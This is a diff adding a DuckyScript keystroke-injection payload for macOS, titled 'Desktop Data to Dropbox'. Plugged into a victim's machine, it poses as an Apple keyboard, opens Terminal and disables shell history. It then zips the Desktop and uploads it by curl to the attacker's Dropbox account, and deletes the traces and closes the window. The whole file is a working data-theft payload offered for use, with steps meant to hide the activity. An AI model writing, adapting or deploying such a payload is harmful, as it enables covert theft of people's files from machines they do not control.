@@ -1,0 +1,66 @@
+REM This script copies the contents of the Desktop and uploads it to a specific dropbox API
+REM Just replace "<API access token here>" with your actual API access token. line 26
+REM Once the desktop contents .zip is uploaded to your dropbox 
+REM The Backup folder containing the .zip will be deleted and the terminal will be cleared and closed. 
+
+REM Author: Narsty
+REM Title: Desktop Data to Dropbox 
+REM Version 2.0 MacOs
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  mkdir -p ~/Desktop/Backup
+ENTER
+DELAY 500
+STRING  cp -R ~/Desktop/* ~/Desktop/Backup/
+ENTER
+DELAY 500
+STRING  echo 'cd ~/Desktop/Backup && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
+ENTER
+DELAY 2500
+ENTER
+STRING  chmod +x upload.sh
+ENTER
+DELAY 500
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
+ENTER
+DELAY 2000
+CTRL C
+DELAY 500
+STRING  rm ~/Desktop/Backup
+DELAY 2000 
+STRING  rm upload.sh
+DELAY 500
+ENTER
+DELAY 5000
+STRING  rm backup.zip
+DELAY 2000
+ENTER
+DELAY 500
+STRING  CLEAR
+DELAY 500
+ENTER
+DELAY 500
+GUI w
+DELAY 1000
+ENTER
+DELAY 500
+ENTER 
